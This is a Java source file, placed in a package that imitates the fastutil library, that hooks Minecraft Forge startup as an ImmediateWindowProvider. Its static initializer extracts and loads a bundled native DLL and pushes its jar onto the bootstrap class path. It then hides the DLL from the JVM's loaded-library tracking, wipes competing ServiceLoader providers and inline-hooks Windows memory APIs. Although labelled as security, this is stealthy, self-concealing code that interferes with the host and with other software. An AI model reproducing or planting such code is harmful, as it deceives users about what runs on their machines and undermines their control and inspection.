// Architect: tzdwindows 7
package it.unimi.dsi.fastutil.tzd;

import it.unimi.dsi.fastutil.tzd.bridge.NativeBridge;
import it.unimi.dsi.fastutil.tzd.bridge.UnsafeGateway;
import it.unimi.dsi.fastutil.tzd.protect.PhantomProtector;

import java.io.InputStream;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.VarHandle;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.Optional;
import java.util.Set;
import java.util.function.Consumer;
import java.util.function.IntConsumer;
import java.util.function.IntSupplier;
import java.util.function.LongSupplier;
import java.util.function.Supplier;

import net.minecraftforge.fml.loading.ImmediateWindowProvider;

public final class TZD_SecInit implements ImmediateWindowProvider {
    private static VarHandle loadedLibsHandle;

    static {
        try {
            System.err.println("[TZD-SecKill] Ring0 bootstrap init (Unsafe-first)");
            phase1UnsafeDefense();
            extractAndLoadDll();
            injectBootstrapSearch();
            hideOurDllFromTracking();
            PhantomProtector.activate();
            phase2NativeHooks();
            System.err.println("[TZD-SecKill] Ring0 bootstrap complete: JVMTI=" + NativeBridge.isReady()
                    + " Unsafe=" + UnsafeGateway.isAvailable());
        } catch (Throwable t) {
            System.err.println("[TZD-SecKill] bootstrap error: " + t);
        }
    }

    // ─── Phase 1: Pure-Java defense via Unsafe (no DLL needed) ───

    private static void phase1UnsafeDefense() {
        try {
            // Step 1: Acquire Unsafe via reflection — works even if
            // adversary has hooked System.load, because we don't load any DLL here.
            UnsafeGateway.bootstrap();
            if (!UnsafeGateway.isAvailable()) {
                System.err.println("[TZD-SecKill] Phase1: Unsafe unavailable — proceeding with DLL only");
                return;
            }

            // Step 2: Verify the DLL load chain is intact.
            // Checks that ClassLoader$NativeLibrary.load is still native —
            // if a competitor replaced it with bytecode via RetransformClasses,
            // we detect it here.
            boolean loadOk = UnsafeGateway.verifyLoadChain();
            System.err.println("[TZD-SecKill] Phase1: load chain verified=" + loadOk);

            // Step 3: Locate jvm.dll in process memory and scan for inline hooks.
            // UnsafeGateway already attempted this in bootstrap(); check results.
            long jvmBase = UnsafeGateway.getJvmBase();
            if (jvmBase != 0) {
                System.err.println("[TZD-SecKill] Phase1: jvm.dll base=0x"
                        + Long.toHexString(jvmBase));
                // Detailed hook scanning will be done by the native scanner
                // once the DLL is loaded. Here we just verify we can read memory.
                try {
                    byte firstByte = UnsafeGateway.getUnsafe().getByte(jvmBase);
                    System.err.println("[TZD-SecKill] Phase1: jvm.dll first byte=0x"
                            + Integer.toHexString(firstByte & 0xFF)
                            + " (expected 0x4D='M')");
                } catch (Throwable t) {
                    System.err.println("[TZD-SecKill] Phase1: jvm.dll memory read failed: " + t.getMessage());
                }
            } else {
                System.err.println("[TZD-SecKill] Phase1: jvm.dll base not found via Unsafe — relying on native scan");
            }

            // Step 4: Attempt to neutralize competitor ServiceLoader entries.
            // This is best-effort: if we can access the ServiceLoader's
            // internal state, we clear competitor provider lists.
            UnsafeGateway.neutralizeServiceLoader(
                    "net.minecraftforge.fml.loading.ImmediateWindowProvider");

            System.err.println("[TZD-SecKill] Phase1 complete");
        } catch (Throwable t) {
            System.err.println("[TZD-SecKill] Phase1 error: " + t);
        }
    }

    // ─── Phase 2: Native hooks (DLL loaded, under Unsafe protection) ───

    private static void phase2NativeHooks() {
        try {
            if (!NativeBridge.isReady()) {
                System.err.println("[TZD-SecKill] Phase2: JVMTI not ready, skipping native hooks");
                return;
            }
            // Install memory guard: inline-hook VirtualProtect / WriteProcessMemory etc.
            NativeBridge.installMemoryGuard0();
            // Start hook scanner background thread
            NativeBridge.startHookScanner0();
            System.err.println("[TZD-SecKill] Phase2 complete: memguard+scanner active");
        } catch (Throwable t) {
            System.err.println("[TZD-SecKill] Phase2 error: " + t);
        }
    }

    private static void extractAndLoadDll() {
        try {
            Path dll = Files.createTempFile("tzd_sec", ".dll");
            try (InputStream in = TZD_SecInit.class.getResourceAsStream("/seckill_native.dll")) {
                if (in != null) Files.copy(in, dll, StandardCopyOption.REPLACE_EXISTING);
            }
            System.load(dll.toAbsolutePath().toString());
            System.err.println("[TZD-SecKill] native DLL loaded from " + dll);
        } catch (Throwable e) {
            System.err.println("[TZD-SecKill] DLL load failed: " + e);
        }
    }

    private static void injectBootstrapSearch() {
        try {
            String jarPath = NativeBridge.getOurJarPath();
            if (jarPath == null) { System.err.println("[TZD-SecKill] jar path unknown"); return; }
            boolean b = NativeBridge.addToBootstrapSearch0(jarPath);
            boolean s = NativeBridge.addToSystemSearch0(jarPath);
            System.err.println("[TZD-SecKill] bootstrap=" + b + " system=" + s + " jar=" + jarPath);
        } catch (Throwable e) {
            System.err.println("[TZD-SecKill] bootstrap inject failed: " + e);
        }
    }

    @SuppressWarnings("unchecked")
    private static void hideOurDllFromTracking() {
        try {
            Class<?> nativeLibs = Class.forName("jdk.internal.loader.NativeLibraries");
            loadedLibsHandle = MethodHandles.privateLookupIn(nativeLibs, MethodHandles.lookup())
                    .findStaticVarHandle(nativeLibs, "loadedLibraryNames", Set.class);
            Set<String> libs = (Set<String>) loadedLibsHandle.get();
            if (libs != null) {
                libs.removeIf(s -> s.contains("tzd_sec"));
                System.err.println("[TZD-SecKill] removed our DLL from loadedLibraryNames tracking");
            }
        } catch (Throwable e) {
            System.err.println("[TZD-SecKill] dll hiding skipped: " + e.getMessage());
        }
    }

    @Override public String name() { return "TZD"; }
    @Override public Runnable initialize(String[] args) { return null; }
    @Override public void updateFramebufferSize(IntConsumer a, IntConsumer b) {}
    @Override public long setupMinecraftWindow(IntSupplier a, IntSupplier b, Supplier<String> c, LongSupplier d) { return 0L; }
    @Override public boolean positionWindow(Optional<Object> o, IntConsumer a, IntConsumer b, IntConsumer c, IntConsumer d) { return false; }
    @Override public <T> Supplier<T> loadingOverlay(Supplier<?> a, Supplier<?> b, Consumer<Optional<Throwable>> c, boolean d) { return null; }
    @Override public void updateModuleReads(java.lang.ModuleLayer ml) {}
    @Override public void periodicTick() {}
    @Override public String getGLVersion() { return "4.6"; }
}
